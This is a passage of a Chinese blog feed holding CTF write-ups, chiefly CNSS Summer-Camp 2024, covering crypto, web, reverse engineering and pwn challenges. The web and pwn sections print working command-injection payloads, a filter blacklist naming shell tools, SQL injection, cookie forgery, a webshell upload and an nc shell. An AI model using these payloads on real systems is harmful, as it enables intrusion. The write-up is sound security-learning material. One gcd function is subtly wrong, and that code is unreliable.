的初始记录。&quot;) 接着监测特定题目人数并在变化时遍历： 123456789101112131415161718192021222324252627282930313233343536373839404142async def monitor_pass_number(session, user_ids): global previous_pass_number current_pass_number = await fetch_pass_number(session) if current_pass_number is not None: if previous_pass_number is None: previous_pass_number = current_pass_number print(f&quot;初始 pass_number: {current_pass_number}&quot;) elif current_pass_number &gt; previous_pass_number: print(f&quot;pass_number 增加了！新的 pass_number: {current_pass_number}&quot;) await check_user_submission_changes(session, user_ids) previous_pass_number = current_pass_number else: print(f&quot;当前 pass_number: {current_pass_number}&quot;) else: print(&quot;无法获取 pass_number&quot;)async def check_user_submission_changes(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, new_submission in zip(user_ids, submissions): if new_submission is None: continue previous_submission = user_submissions.get(user_id, []) new_tasks = {task['TaskID']: task for task in new_submission} old_tasks = {task['TaskID']: task for task in previous_submission} for task_id, new_task in new_tasks.items(): old_task = old_tasks.get(task_id) if not old_task or old_task.get('Score') != new_task.get('Score'): if new_task.get('TaskTitle') == TARGET_TASK_TITLE: user_name = f&quot;User {user_id}&quot; task_name = new_task.get('TaskTitle') passing_time = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) print(f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;) user_submissions[user_id] = new_submission 运行上述代码，得到输出结果。速度有明显提升。 🤖GPT2目标：你可能已经发现了，你的程序可能并没有我演示的跑的那么快（神机请忽略）。 你的目标就是优化该程序的性能，在保证结果不变的情况下更快的完成文本的补全。 我会使用一些测试点来评测你的程序的正确性和执行时间。期待更高的效率和更多样的优化方案。 此外，请在 wp 中回答下面的问题： 什么是阿姆达尔定律？根据阿姆达尔定律，我们应该把优化的重点放在哪里？ 你的优化方案和思路是什么？优化的效果受到哪些因素影响？ 题解：按照指示完成GPT2，make运行一下，发现需要20多秒。 阿姆达尔定律是一个经验法则，代表处理器并行运算之后效率提升的能力。在并行计算中，使用多个处理器的程序的加速比受限制于程序串行部分的执行时间。$$s(n)=\\frac{1}{B+(1-B)/n}$$ $s(n):$ 固定负载下，理论上的加速比 $B:$ 串行工作部分所占比例，取值0~1 $n:$ 并行线程数，并行处理节点个数 可以看出，即使我们增加处理器数量，只能对并行部分产生影响，而对非并行部分没有任何影响。因此随着处理器数量增加，整体性能的提升会趋于平缓。 根据阿姆达尔定律，应该将优化重点放在最小化串行部分，同时最大化可并行部分。 浏览源gpt.c代码中注意到，存在矩阵乘法、注意力机制和涉及大量计算的循环，可以进行并行计算，将任务分配到多个处理器上，使用OpenMP并行化矩阵乘法、前馈神经网络层等。 具体操作是在matmul_forward和attention_forward函数循环前添加代码： 12#include &lt;omp.h&gt;#pragma omp parallel for collapse(2) 同时，在MakeFile中开启编译选项-fopenmp。 12345release: cc gpt.c -lm -O3 -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gptdebug: cc gpt.c -lm -O1 -g -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gpt 前后对比一下 在保证结果不变的情况下更快的（5~6秒)完成了文本的补全。 优化效果受影响的因素： 串行部分：总加速比会受到制约 硬件资源：可用处理器的数量和硬件的性能 编译器的优化程度 并行化的开销。","link":"/2024/09/30/CNSS%20Recruit%202024%20Dev%20wp/"},{"title":"CNSS Summer-Camp 2024 wp","text":"CTF（Capture The Flag，夺旗赛）起源于 1996 年 DEFCON 全球黑客大会，是网络安全爱好者之间的竞技游戏。参赛者通过各种手段攻破系统、解决谜题，获取「flag」。想提前了解 CTF 以及各个方向，可以参见【CTF Wiki】. CNSS在2024年8月的CTF夏令营题目，记录一下自己打的wp。 OK, now, let’s Capture The Flag! 🔢Crypto🔮cnss娘的谜语常见编码，把十进制、十六进制、二进制和 base64 分别转化为字节，拼起来后 utf-8 转成 string 就能还原出flag。 cnss{学会编码是学 Crypto 的第一步。!} 🐬水龙吟解一个线性同余方程：$$c \\equiv mg\\pmod{p}$$ 用逆元求解： 首先用 Euclid 算法递归计算 $g$ 和 $p$ 的最大公约数 $gcd(g, p)$： 12345def gcd(a, b): if b == 0: return a return gcd(a, a % b)# gcd(g, p) = 23027835966762406 方程两边同时除以 $gcd$，只需找到 $g’$ 的逆元即可。$$m\\equiv c’g’\\pmod{p’}$$ 用 Extend Euclid alg 求解：向下递，向上归。 12345def exgcd(a, b): if b == 0: return a, 1, 0 d, x, y = exgcd(b, a % b) return d, y, x - (a // b) * y 解出 $m$ 就能还原出 flag。 cnss{Subgroup @nd Eucl1d algOrithm 1s eleg4nt.} 🌔卜算子 欧拉定理 若 $n$，$a$ 为正整数且 $gcd(a, n)=1$，则$a^{\\phi(n)}\\equiv1\\pmod{n}$。 由于 $c\\equiv m^e\\pmod{n}$，设 $d$ 为 $e$ 模 $\\phi(n)$ 的逆元，即$$ed\\equiv 1\\pmod{\\phi(n)}$$则有$$c^d\\equiv m^{ed}\\equiv m^{1+k\\phi(p)}\\equiv m\\pmod{n}$$因此，利用三素数 RSA 即可解出 flag。 cnss{1t is similar to two-prime RSA....} 🐠Fun_factoring首先init()函数生成了前100个素数，$q_1-1$ 光滑，考虑使用 Pollard’s p - 1 algorithm。 根据 Fermat’s little theorem：若 $p$ 是 $N$ 的素因子，且 $a$ 与 $p$ 互素，则$$a^{p-1}\\equiv 1\\pmod{p}$$ $$a^{t(p-1)}-1^t=kp$$ Pollard's p-1 algorithm 若 $p$ 是一个 B-smooth number，则存在 $$M = \\prod_{q\\leq B} q^{\\lfloor \\log_q B \\rfloor}$$ 使得 $(p-1)|M.$ 计算 $gcd(a^M-1,N)$。如果结果不为 $1$ 或 $N$，那么就成功分解了 $N$。 不是很懂这个结构… 其实不难发现 $ B!\\ |\\ p-1$。所以只需找到一个合适大小的数 $B$，就可以在多项式时间内出结果，拿到 flag1。 12345678910#expa = 2B = 2while True: a = pow(a, B, N) res = gcd(a - 1, N) if res != 1 and res != N: q = N // res break B += 1 cnss{1f_y0u_Kn0w_Pollard_y0u_Kn0w_1t_4ll} 注意到 hint2 实际上是 $e$ 和 $d$ 的乘积，计算 $k=ed-1$ 为 $p-1$ 的倍数。选随机数 $g\\in(1,N)$。 RSA: how to factorize N given d $k$ 为偶数，故 $k=2^t\\cdot r$，其中 $r$ 为奇数且 $t\\geq 1$，然后计算 $x=g^{\\frac{k}{2}},g^{\\frac{k}{4}},…,g^{\\frac{k}{2^t}}\\pmod{N}$ 直到 $x&gt;1$ 且 $y=gcd(x-1,N)&gt;1$。如果 $y$ 存在，则 $p=y$；若不存在，则重新生成 $g$. 12345678910111213#expk = e * d - 1while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gcd(x - 1, n) &gt; 1: p = gcd(x - 1, n) return (p, n // p) 根据欧拉定理$$g^{\\phi(n2)\\cdot(r-1)}\\equiv1\\pmod{hint1}$$而设 $ed-1=k\\phi(n2)$，测试可知 $k&gt;&gt;r-1$，则有$$g^{ed-1}\\equiv 1\\pmod{hint1}$$所以，我们先通过 hint1 把 n2 分解出来，再分解出 p2 和 q2 拿到 flag2。 cnss{Factoring_the_modulus_1s_FUn_fuN_Fun_f0r_The_whOLe_F4miLY!} 这两种方法的核心就是费马小定理。 🦢BabyCurve简单的椭圆曲线群，sage 跑一下就行了。主要是求 e 在椭圆曲线群 E 上的逆元 d。熟悉一下 sage 里和 EllipticCurve 相关的操作即可。运行一段时间，拿到 flag。 cnss{The elliptic curve 0ver a fin1te f1eld is an ab3lian group!} 🔑Small private key这是一个 wiener attack。Google 搜到一篇论文 New Attacks on RSA with Modulus N = p2q Using Continued Fractions，拿 AI 翻译了一遍算法，拿到 flag。 cnss{Th1s is the p0wer of continu3d fr@ction hhhhhhh} 🐿️物不知数这题在求 DLP，先分解 n，再结合 CRT，依靠前四个因子就行，拿到 flag。其实就是 Pohlig-Hellman algorithm。 cnss{Wow!The CRT 1s S0 u5eful!} ⚒️铜匠的艺术Ⅱ不会。 ⛏️铜匠的艺术Ⅰp 和 q 相差很大，unbalanced rsa，搜到了一篇maple的一模一样的博客，d = p，意味着$$en\\equiv epq \\equiv q\\pmod{\\phi(n)}$$根据 Euler Theorem，$2^{en}\\equiv 2^q \\pmod{n}$，再根据 Fermat 小定理，reduce 到模 q，有$$2^{en}\\equiv 2^q\\equiv 2\\pmod{q}$$所以 $gcd(2^{en}-2)$ 是 $n$ 的一个 nontrival factor。给 e 的话就可以直接解了，但这题没给。 那也就是说，在$m^{en}\\equiv m\\pmod{q}$下，构造多项式 $f(x)=x^{en}-x$，coppersmith 找到其在模意义下的根 $m$，拿到 flag。 cnss{Am@zing!Y0u hav3 found the art 0f c0pper5mith!} 😋叒是欧几里得这里Alice用同一公钥e对两个具有线性关系的消息加密，并将加密后的消息发送给了Bob。满足Related Message Attack的攻击条件，Franklin–Reiter related-message attack即可。 在这篇博客里找到了一模一样的攻击。 嗨，又是铜。$m_1=m+k_1\\delta,\\ m_2=m+k_2\\delta$，$r=(k_1-k_2)\\delta$。flag cnss{Half-GCD 1s so u5eful!} ⚽Permutation不会。 🕸️Web做密码题的时候遇到很多和web交互的情况，遂前来学习（玩）。不会Web，打着玩的。 🦴babyHTTPpsych 上课开小差，下课之后同桌说今天学的 HTTP 请求，然而 psych 并不知道这个知识点，请你帮他完成作业，获得 flag 。 HTTP 请求有什么内容呢？ 一张图说明访问网站的流程 硬核！30 张图解 HTTP 常见的面试题 cURL是一种通过命令行或脚本进行数据传输的工具，支持多种协议，可以用来发送http请求，获取服务器响应。（还有其他功能） -i(--include)选项在输出中包含服务器返回的HTTP响应头信息。-v(--verbose)选项显示请求的详细信息和调试信息。 123456$ curl &quot;http://152.136.11.155:10101/&quot;Please GET me a CNSS with a value of 'hackers'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot;And I need you POST a web with a value of 'fun'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; Do you know cookie?You are not admin! 关于cookie我们-i看一下，找到Set-Cookie: admin=false，改成true就行了。 12$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; -b &quot;admin=true&quot;CNSS{w2b_!s_Reai1y_7un!!!} 御林的题还考了Referer，提示我们You must come from “YulinSec://127.0.0.1” 1$ curl curl &quot;http://101.35.209.40:44505/?key1=YulinSec&quot; -X POST -d &quot;key2=YulinSec&quot; -H &quot;Referer:YulinSec://127.0.0.1&quot; 关于302跳转重定向的题，看源码提示我们flag位于/302.php下，直接curl即可查到flag。HTTP OPTIONS Method 🙋🏼‍♀️PHPinfoCNSS娘！phpinfo文件是什么呀！ 如何创建phpinfo文件并查看PHP信息 – WordPress大学 (wpdaxue.com) 直接在URL后添加/phpinfo.php查找即可。 1cnss{l3t_u5_l3arn_php!nfo!} 🥇我得再快点考验手速的时候到了 scRsCrIptiPt 看了网页的源代码，使用javascript实现一个自动刷新的页面，GET传参到/check就行了。 12345&lt;p&gt;Key : 6Dd3LzGVhvEn8wv&lt;span id=&quot;variable&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;form action=&quot;/check&quot; method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;value&quot; name=&quot;value&quot; required&gt; &lt;button type=&quot;Flag&quot;&gt;Flag&lt;/button&gt; &lt;/form&gt; 机器的确是比人快呀！写一个python脚本，Requests库与网站进行交互。 12345678910111213141516171819202122232425262728293031import requestsimport hashliburl = 'http://152.136.11.155:10103'submit_url = 'http://152.136.11.155:10103/check'def get_md5_hash(): try: content = requests.get(url).text key = content.split('Key : ')[1].split('&lt;span id=&quot;variable&quot;&gt;')[0].strip() return hashlib.md5(key.encode()).hexdigest() except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Nonedef submit_md5(md5_hash): try: return requests.get(submit_url, params={'value': md5_hash}).text except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Noneif __name__ == &quot;__main__&quot;: md5_hash = get_md5_hash() if md5_hash: result = submit_md5(md5_hash) if result: print(result)&quot;&quot;&quot;cnss{3njoy_py5crIpt_n0w!!}&quot;&quot;&quot; 🏓Pingpsych：#pingCNSS娘：pong! 连上之后只有一段PHP代码： 12345if (isset($_POST['ip'])) { $ip = $_POST['ip']; $ping_result = ping($ip); echo nl2br($ping_result); } 很明显这是让我们用POST方法传一下ip地址，然后服务器执行ping函数。试一下： 12345678$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1&quot;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms&lt;br /&gt;&lt;br /&gt;--- 127.0.0.1 ping statistics ---&lt;br /&gt;2 packets transmitted, 2 received, 0% packet loss, time 31ms&lt;br /&gt;rtt min/avg/max/mdev = 0.039/0.042/0.046/0.007 ms 发现有回显，但过于正常。通过搜索ctf web ping得知，可以使用命令连接符尝试列目录。于是 1234$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;ls&quot;Error: Invalid input.$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;&quot;Error: Invalid input. 不幸又幸运的是，我们知道分号;被滤掉了。开搜！ 12$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0als&quot;index.php 出现了，emmm，不是想要的。别急，看看怎么个事儿：哎，空格也被过滤了。 1$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0acat%09index.php&quot; 12345678910111213141516171819202122232425262728293031323334353637function validate_input($input) {$invalid_chars = array(&quot;sh&quot;,&quot;bash&quot;,&quot;chown&quot;,&quot; &quot;, &quot;chmod&quot;, &quot;echo&quot;, &quot;+&quot;, &quot;&amp;&quot;,&quot;;&quot;, &quot;|&quot;, &quot;&gt;&quot;, &quot;&lt;&quot;, &quot;`&quot;, &quot;\\\\&quot;, &quot;\\&quot;&quot;, &quot;'&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;}&quot;, &quot;[&quot;, &quot;]&quot;);foreach ($invalid_chars as $invalid_char) {if (strpos($input, $invalid_char) !== false) {return false;}}if (preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $input)) {return false;}return true;}function ping($ip_address) {if (!validate_input($ip_address)) {return &quot;Error: Invalid input.&quot;;}$cmd = &quot;ping -c 2 &quot; .$ip_address;exec($cmd, $output, $return_code);if ($return_code !== 0) {echo(&quot;Error: Failed to execute command.&quot;);}return implode(&quot;\\n&quot;, $output);}if (isset($_POST['ip'])) {$ip = $_POST['ip'];$ping_result = ping($ip);echo nl2br($ping_result); // 输出ping结果并保留换行}?&gt; 总算看到过滤层了。去其TA目录看看吧。 哈？哈！Here it is！来来让我们cat一下： 12curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=1.1.1.1%0acat%09../../../f*&quot;CNSS{p0ng_pong_p0ng!!!} 在这之前我一直尝试网上搜到的各种绕过flag限制的方法，直到 fan✌️一句话点醒了我 学到了，谢谢宝宝（啾咪）&gt; 🐶CNSS娘の宠物商店CNSS娘开始创业啦！CNSS娘の宠物商店正式开业！ CNSS娘的账号是 admin , 登陆查看CNSS娘藏在后台的秘密…… sql注入' or 1='1。 1CNSS{h0w_d0_y0u_637_7h3_p455w0rd1?} 🎮20482048真好玩，玩到1000000分就能拿到flag！ 不是，你真玩啊？ 禁了F12和右键，Ctrl+Shift+I打开控制台，查看Flag按钮的HTML标签，注意到 1&lt;input type=&quot;button&quot; onclick=&quot;getflag()&quot; value=&quot;Flag&quot;&gt; 在Sources的main2048.js中查到getflag()函数（以及下面各种屏蔽），发现是一堆乱码。想法是找到判断点1000000分但是没查到，复制下来转去查score，发现 1if(score&gt;=0xf4240) 这个0xf4240刚好是1000000，给它改成0再按一下Flag按钮即可拿到flag。 1cnss{3asy_fr0nt_kn0w1edge!!!} 👤换个头像先CNSS娘这么可爱，你确定要把她换掉吗？ 真的只能上传图片吗？ 账号密码都是admin登陆，上传一句话木马。改一下后缀绕过检查，先把php改成png，上蚁剑连接getshell即可。 🔍Reverse这个夏天，我第一次接近了那个女人。 😍那个女人上课的时候Shino老师讲了一个工具可以用来逆向软件，但是Timlzh忘掉软件叫什么了，只记得头像是那个女人…… 成功安装IDA Pro，打开即得flag 1CNSS{Sh3_1s_IDA!W3lc0m3_t0_Rev3rse_W0rld!} 😭我的flag碎了一地我的flag碎掉了，你能帮我找回来吗？ 用IDA打开找flag、学会在IDA中使用F5。 打开IDA发现三个hint，Shift+F12能打开Strings，找到第一部分；左侧Functions栏上方找到第二部分；根据提示，X查看交叉引用，找到funs718，F5看到 1234567891011121314151617int func718(){ puts(&quot;718&quot;); br0ken_4parT_(); putchar(66); putchar(117); putchar(55); putchar(95); putchar(89); putchar(48); putchar(117); putchar(95); putchar(99); putchar(64); putchar(110); return putchar(95);} 这里putchar给的不完整，退回去能看到完整的最后一部分，拿到flag 1CNSS{My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!} ✈️打飞机高手你会打飞机吗？高分有奖哦！✈️ Patch Program 找程序漏洞，修改逻辑以出现flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int __fastcall main(int argc, const char **argv, const char **envp){ _main(argc, argv, envp); Startup(); while ( IsOver ) { UpdateInput(); UpdateNormal(); Show(); } printf(&quot;\\t\\tYou Are so WEAK!\\n&quot;); Sleep(0x9C4u); system(&quot;pause&quot;); return 0;}int Show(){ int result; // eax int j; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] HideCursor(); gotoxy(1LL, 1LL); for ( i = 0; i &lt;= 26; ++i ) { for ( j = 0; j &lt;= 61; ++j ) { switch ( canvas[62 * i + j] ) { case 1: printf(&quot;*&quot;); break; case 2: printf(asc_14001301C); break; case 3: printf(&amp;asc_14001301C[2]); break; case 0xFFFFFFFF: printf(&amp;asc_14001301C[4]); break; default: if ( canvas[62 * i + j] ) { if ( canvas[62 * i + j] == 4 ) printf(&amp;asc_14001301C[8]); } else { printf(&amp;asc_14001301C[6]); } break; } } printf(&amp;asc_14001301C[10]); } printf(&quot;\\nScore: %d&quot;, score); result = score; if ( score &gt; 1145141918 ) { printf(&quot;\\t\\tWell Done! You got the flag!\\n\\t\\t&quot;); get_flag(); // 发现可疑函数!!! Sleep(0x9C4u); return system(&quot;pause&quot;); } return result;} 在函数开头直接放上可疑函数即可，Edit-Patch Program-Assemble，右键、退出、鼠标点击空白处就可以看到变化后的代码，最后记得Apply Patches to… 运行修改好的exe程序，拿到flag 1cnss{w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!} ♾️亦真亦或亦假尊嘟假嘟? O.o 纯加密题，根据题目不难猜是异或相关的。IDA打开以后Ctrl+F查一下main函数，看一下代码逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __fastcall main(int argc, const char **argv, const char **envp){ _QWORD v4[12]; // [rsp+20h] [rbp-60h] BYREF int v5; // [rsp+80h] [rbp+0h] _QWORD v6[12]; // [rsp+90h] [rbp+10h] BYREF int v7; // [rsp+F0h] [rbp+70h] int i; // [rsp+FCh] [rbp+7Ch] _main(argc, argv, envp); v6[0] = 0x731047656E6F7579LL; v6[1] = 0x761B45794B10407DLL; v6[2] = 0x6E005B71491F585FLL; v6[3] = 0x45045205575D01LL; memset(&amp;v6[4], 0, 64); v7 = 0; memset(v4, 0, sizeof(v4)); v5 = 0; printf(&quot;Input your flag: &quot;); scanf(&quot;%s&quot;, v4); eNc0d3(v4); // 发现可疑点，这里对v4进行了加密 for ( i = 0; i &lt;= 30; ++i ) { if ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) ) { printf(&quot;Wrong!\\n&quot;); return 0; } } printf(&quot;Correct!\\n&quot;); return 0;}__int64 __fastcall eNc0d3(__int64 a1){ __int64 result; // rax int i; // [rsp+8h] [rbp-8h] int v3; // [rsp+Ch] [rbp-4h] v3 = 26; for ( i = 0; ; ++i ) { result = *(unsigned __int8 *)(a1 + i); if ( !(_BYTE)result ) break; *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i); } return result;} 加密是一个循环，读取flag地址加上i偏移位置的一个字节。将v3和读取到的字节进行异或，结果写回到同一位置。 主函数循环是在比较加密后v4和v6的前30个字节是否相同，也就是给我们密文v6，还原明文即可。 123456789101112131415161718#include &lt;stdio.h&gt;int main() { char c[32]; *(long long *)&amp;c[0] = 0x731047656E6F7579LL; *(long long *)&amp;c[8] = 0x761B45794B10407DLL; *(long long *)&amp;c[16] = 0x6E005B71491F585FLL; *(long long *)&amp;c[24] = 0x45045205575D01LL; int v3 = 26; for (int i = 0; i &lt; 31; i++) { c[i] ^= v3++; } printf(&quot;%s&quot;, c); return 0;}/* cnss{X0R_c4n_b3_us3d_t0_3nc0d3} */ 🍵茶杯头大冒险爱养生的Timlzh带着他的茶杯头来向你求助，你能帮他找到他心爱的茶壶吗😔 纯加密题，搜了一下应该是属于TEA加密，闻所未闻，看一下代码逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int __fastcall main(int argc, const char **argv, const char **envp){ _DWORD Str[8]; // [rsp+20h] [rbp-60h] BYREF _DWORD v5[8]; // [rsp+40h] [rbp-40h] unsigned int v6[6]; // [rsp+60h] [rbp-20h] BYREF int j; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] _main(argc, argv, envp); v6[0] = 429459223; v6[1] = 537200643; v6[2] = 537462290; v6[3] = 537006083; v5[0] = -999025570; v5[1] = 970203505; v5[2] = -181949973; v5[3] = -483739382; v5[4] = 1062983671; v5[5] = -697079924; printf(&quot;input the flag: \\n&quot;); scanf(&quot;%s&quot;, Str); if ( strlen((const char *)Str) == 24 ) { for ( i = 0; i &lt;= 4; ++i ) encrypt(&amp;Str[i], v6); for ( j = 0; j &lt;= 5; ++j ) { if ( Str[j] != v5[j] ) { printf(&quot;it's not my teapot!&quot;); return 0; } } printf(&quot;Oh my god, you made it?!&quot;); system(&quot;pause&quot;); return 0; } else { printf(&quot;the length is NSFW~~~&quot;); return 0; }}__int64 __fastcall encrypt(unsigned int *a1, unsigned int *a2){ __int64 result; // rax unsigned int i; // [rsp+10h] [rbp-10h] unsigned int v4; // [rsp+14h] [rbp-Ch] unsigned int v5; // [rsp+18h] [rbp-8h] unsigned int v6; // [rsp+1Ch] [rbp-4h] v6 = *a1; v5 = a1[1]; v4 = 0; for ( i = 0; i &lt;= 0x1F; ++i ) { v6 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (a2[v4 &amp; 3] + v4); v4 += 289739793; v5 += (((v6 &gt;&gt; 5) ^ (16 * v6)) + v6) ^ (a2[(v4 &gt;&gt; 11) &amp; 3] + v4); } *a1 = v6; result = v5; a1[1] = v5; return result;} 加密过程a1是明文，a2是密钥。 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t* v, const uint32_t* key) { uint32_t v0 = v[0], v1 = v[1]; const uint32_t delta = 0x11451411; uint32_t sum = delta * 32; for (int i = 0; i &lt; 32; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1;}int main() { uint32_t key[4] = {429459223, 537200643, 537462290, 537006083}; uint32_t enc[6] = {0xC474145E, 0x39D42171, 0xF527A9EB, 0xE32AB90A, 0x3F5BD7F7, 0xD673678C}; for (int i = 4; i &gt;= 0; i--) { decrypt(&amp;enc[i], key); } for (int i = 0; i &lt; 6; i++) { printf(&quot;%c%c%c%c&quot;, enc[i] &amp; 0xFF, (enc[i] &gt;&gt; 8) &amp; 0xFF, (enc[i] &gt;&gt; 16) &amp; 0xFF, (enc[i] &gt;&gt; 24) &amp; 0xFF); } putchar('\\n'); return 0;}/* cnss{Enj0y_te4_W!th_me!} */ 💥爆了爆了，和 JAVA 爆了啊？逆向还要学 Java？ 非常简单且入门的安卓逆向 你需要了解apk文件结构 JEB或JADX的使用 以及简单的java语法 JADX打开，翻找一通，找到com.cnss.myapplication，就是这道题的关键了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586class Test: def __init__(self): self.str = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'] def main(self): a = [ &quot;SJNPhthkmYBHow5Y75wRDa==&quot;, &quot;RoBAU/g/jlxuy+Ns1YtA86==&quot;, &quot;YZNTjQcHgoBaqf5hyYtM0K==&quot;, &quot;Z1Z/gv18ro1pkgF2rX5x+6==&quot;, ...#100个 &quot;bXF7hfV5smIOu/1q159Q16==&quot;, &quot;c441i+Z6r55Lmf9H4V=XD===&quot;, &quot;aY1MmRldcYRrtdlh50RJC===&quot;, &quot;Y5dYaAcAjoBtug1NwYFUBa==&quot;, &quot;TIk6kw9/pnZ41eRs1IZr4a==&quot;, &quot;cIU9ZQpjiINPy/kOw31OEa==&quot; ] for i in range(100): s = self.decode(a[i]) print(a[i]) print(s) def decode(self, code): length = len(code) if length == 0 or length % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') result = [] block_num = length // 4 for i in range(block_num): after_decode = self.decode_detail(code[i * 4:(i * 4) + 4]) if after_decode: result.append(after_decode) result_str = ''.join(result) return result_str[:len(result_str) - end_equal_num] def decode_detail(self, s): if len(s) != 4: return None a1 = self.get_index(s[0]) self.qwq() a2 = self.get_index(s[1]) self.qwq() a3 = self.get_index(s[2]) self.qwq() a4 = self.get_index(s[3]) self.qwq() b = [ chr((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4)), chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)), chr(((a3 &amp; 3) &lt;&lt; 6) | a4) ] return ''.join(b) def get_index(self, c): try: return self.str.index(c) except ValueError: return -1 def qwq(self): tmp = [None] * 64 for i in range(len(self.str)): tmp[i] = self.str[(i + 2) % 64] self.str = tmp.copy()if __name__ == &quot;__main__&quot;: test = Test() test.main() 根据提示，key is a meaningful sentence，写个python脚本解一下base64，得到密钥。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from base64 import b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpaddef decode(code): if len(code) == 0 or len(code) % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') decoded_str = '' for i in range(0, len(code), 4): decoded_str += decode_detail(code[i:i+4]) result = decoded_str[:-end_equal_num] return resultdef decode_detail(encoded_str): str_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; a1 = str_chars.index(encoded_str[0]) a2 = str_chars.index(encoded_str[1]) a3 = str_chars.index(encoded_str[2]) a4 = str_chars.index(encoded_str[3]) b = chr(((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4))) + \\ chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)) + \\ chr(((a3 &amp; 3) &lt;&lt; 6) | a4) return bdef qvq(key_str): cipher_text = b64decode(&quot;11VaDwVeOwKvL6eqb2hsA2rb0wTbTRwsb7WirGpBW8s=&quot;) key = key_str.encode('utf-8') cipher = AES.new(key, AES.MODE_ECB) decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size) return decrypted_data.decode('utf-8')key = &quot;I am CNSS AESkey&quot;decrypted_message = qvq(key)print(decrypted_message)&quot;&quot;&quot;cnss{We1c0Me t0 Andorid Rev!}&quot;&quot;&quot; 💥PwnPwn真是太有趣辣！从零开始的PWN之路！ 😯nc? nc!nc 152.136.11.155 10020 system(‘/bin/sh’)，直接netcat一键getshell，Linux连接，cat flag 12345$ nc 152.136.11.155 10020 Welcome to CNSS Recruit 2024!Start your journey to become a pwn master!cat flagcnss{Welcome_to_pwn_world!} 🤖Bot偷偷告诉你，CNSS娘bot里其实藏了一个人。 前任中之人Shino，随着年纪渐长，已经无法满足群友日益增长的水群需求。CNSS娘迫切需要新的接班人！ 为了不被群友识破，你需要按照操作规范水群：完成100次交互即可通过考核。 nc 152.136.11.155 10021 有个很好用的库叫pwntools！ 一道Pwntool交互题。程序的逻辑就是循环100次后跳出循环，执行system函数。在循环内部会执行broadcast或bot_ping这两个函数。 12345678910111213141516171819202122232425262728293031323334353637from pwn import *import rehost = '152.136.11.155'port = 10021p = remote(host, port)for i in range(100): data = p.recvline().decode() if '[SYSTEM]' in data: match = 